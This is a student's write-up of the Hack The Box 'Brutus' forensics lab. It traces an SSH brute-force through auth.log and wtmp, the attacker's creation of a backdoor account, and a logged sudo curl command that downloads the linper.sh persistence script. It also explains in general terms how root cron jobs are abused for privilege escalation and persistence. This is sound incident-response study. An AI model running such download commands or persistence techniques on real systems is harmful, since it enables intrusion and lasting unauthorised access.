## SSH Brute-force attack analysis (Brutus) - Dat Vu


**Scenario:** I investigated a case where attacker has successfully brute-forced a machine via SSH login and did lateral-movements afterwards.

**Artifacts:** auth.log, wtmp file

> 



---

# Analysis
Attacker attempted to brute force the machine. Once inside, the attacker created new user and curled a file.
## SSH Brute-force attack
Using auth.log.

From line 1-11, it appeared to be a normal session (CRON activity) opened (at 06:18:01) for user "confluence" by root user (uid=0) and it was closed at (06:19).

![image](https://hackmd.io/_uploads/rJV-iZV5bx.png)

Though in line 11 ("Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22") there is a failed authentication, this is just a normal AWS background process and there is nothing to do with attacker.

Root user then was accessed by **user 203.101.190.9** (line 12-67) but there was no anomaly artifact. Just document this artifact.

![image](https://hackmd.io/_uploads/ByighbN5bx.png)

Root user also opened a session for user "confluence" again (line 16-67).

Line 68 shows that an user (with IP address 65.2.161.68) has tried to login with the username admin but failed.

![image](https://hackmd.io/_uploads/S1lq3-4q-g.png)

The attack guessed the username (backup, admin, server_adm, svc_account) and there were many failed password attempts.
![image](https://hackmd.io/_uploads/rytK0IH5Zx.png)
![image](https://hackmd.io/_uploads/HJfxJwBqbx.png)
![image](https://hackmd.io/_uploads/SkcZkDr5-e.png)
![image](https://hackmd.io/_uploads/BJ3I1wScbe.png)

Line 280 shows that password has been accepted but there was still no connection established successfully. Attacker might get the right password at this time.

![image](https://hackmd.io/_uploads/ryl7lPB5bl.png)

Attacker finally loged into root machine successfully (line 322) and a session 37 was opened at Mar  6 06:32:44. Attacker did lateral movements (created user, added to group, changed password, curled file...) then.
![image](https://hackmd.io/_uploads/Hy78lDrcbl.png)
## WTMP to check Root Session
Using wtmp file, check if the timestamp that a session for root was opened for the attacker matches the events logged in the wtmp file.

![image](https://hackmd.io/_uploads/Sy9xfDrcZl.png)



---

### Q1: What is the IP address used by the attacker to carry out a brute force attack?

**Answer:** `65.2.161.68`

**Evidence:**
- Failed attempts to brute-force the root machine
![image](https://hackmd.io/_uploads/SkKjGvB9Zl.png)

**Reasoning:**
Analyzing the auth.log file, I detected many rapid attempts to login to the root user made by the IP address 65.2.161.68.


---

### Q2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?



**Reasoning:**
Quite easy to answer as I could find out that root machine was brute-forced successfully first and then the attacker's password has been accepted. 

The attacker has done some lateral movements (created a new user, curled a file...).

![image](https://hackmd.io/_uploads/B1ZS5lEqbe.png)



---

### Q3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives.

**Answer:** `2024-03-06 06:32:45`

**Evidence**
![image](https://hackmd.io/_uploads/BkXx7Pr5Wl.png)

**Reasoning:**
The timestamp that a root session opened for attacker (after being brute-forced) matches the timestamp of the root session made by IP 65.2.161.68 in the wtmp file.

---

### Q4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?



**Answer:** `37`

**Evidence:**
![image](https://hackmd.io/_uploads/r1AD7vS9Zg.png)


**Reasoning:**

Though there were 2 sessions opened for root in the auth.log, just one of them was successful (number 37).

The first session was number 34 but then immediately disconnected from user. (No connection was established.)

![image](https://hackmd.io/_uploads/Bkmvk-E5Wl.png)

---

### Q5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?


**Answer:** `cyberjunkie`

**Evidence:**
- "Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002"

**Reasoning:**
Attacker created a new user to the machine.

![image](https://hackmd.io/_uploads/BysTg-E9Zl.png)

---

### Q6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

**Answer:** `T1136.001`

**How I found it:** Googlinggg

**Reasoning:**
I googled for this kind of attack in MITRE framework and found the ID.

---
### Q7: What time did the attacker's first SSH session end according to auth.log?

**Answer:** `2024-03-06 06:37:24`

**Evidence:**
- "Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37."

**Reasoning:**
Found the timestamp for "session closed" of the session 37 (which is the first SSH session to root by the attacker)

![image](https://hackmd.io/_uploads/HyLzuDr5We.png)
---
### Q8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?


**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

**Evidence:**
- "Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"
![image](https://hackmd.io/_uploads/rJ69XwrcWl.png)

**Reasoning:**
There is  a log indicating that attacker has done a curl to download a file. This is considered as lateral movement.

---


## Lesson Learned

| Field    | Detail                     |
|----------|----------------------------|
| Author   | Dat Vu                     |
| Lab      | Brutus                     |
| Platform | Hack The Box               |
| Difficulty   | Very Easy              |
| Category     | DFIR                   |
| Artifacts    | auth.log, utmp         |
| Tools used   | Linux, UTMP file for analysing wtmp|
| Time taken   | ~ 1 hour               |

![image](https://hackmd.io/_uploads/ByiR4mGq-g.png)
> *Description: 
> In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.*


**Key finding:**
Attacker (65.2.161.68) has brute-forced to the machine and successfully found the right password and got in. The attacker then did some lateral movements.

**What I learned:**
1.  I have read more infos about auth.log and wtmp file in Linux. (auth.log logs all authentication events of all users and wtmp is a binary log file that maintains a historical records of login/logout) 

![image](https://hackmd.io/_uploads/Hko_N-4cWe.png)

![image](https://hackmd.io/_uploads/H1J1SWVc-x.png)

2. CRON activity (Infos from Gemini)
- uid=0 Cron Jobs are High-Risk
- Privilege Escalation: This is a common attack vector where an adversary identifies a script scheduled to run by root. If a low-privileged user has "Write" permissions to that script, they can inject malicious commands into it. When the cron daemon executes the script at its scheduled time, it does so as uid=0, granting the attacker full root access.
- Persistence: Once a hacker gains initial access, they often create a new cron job under the root user. This ensures that even if the system reboots or the current session is terminated, their "backdoor" (a malicious connection back to the attacker) will automatically re-open.
- Misconfiguration Vulnerabilities: Security risks arise if a root cron job executes a file located in a directory where standard users have write access (like /tmp or poorly secured custom app folders). Attackers can replace legitimate files with malicious ones or manipulate the execution environment to hijack the root process.

3. AWS feature EC2 that creates a log

- Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
- AWS feature that lets you SSH into EC2 instances through the AWS console without needing a static key file. When someone tries to connect, AWS dynamically pushes a temporary public key to the instance. This log line means that mechanism was attempted but failed or the key wasn't there or wasn't valid.


**What I missed / got stuck on:**

* Actually I did not know about wtmp before, so I was not familiar with their commands and got confused when trying to find the exact command that filters out the timestamp.
* I also need to be careful as the wtmp file logs events in UTC timebase. There might be some mismatched timestamps.

**How I'd detect this in real life:**
- Brute-force: many rapid attemps to login

---
*Keep swimming,*
*Dat Vu.*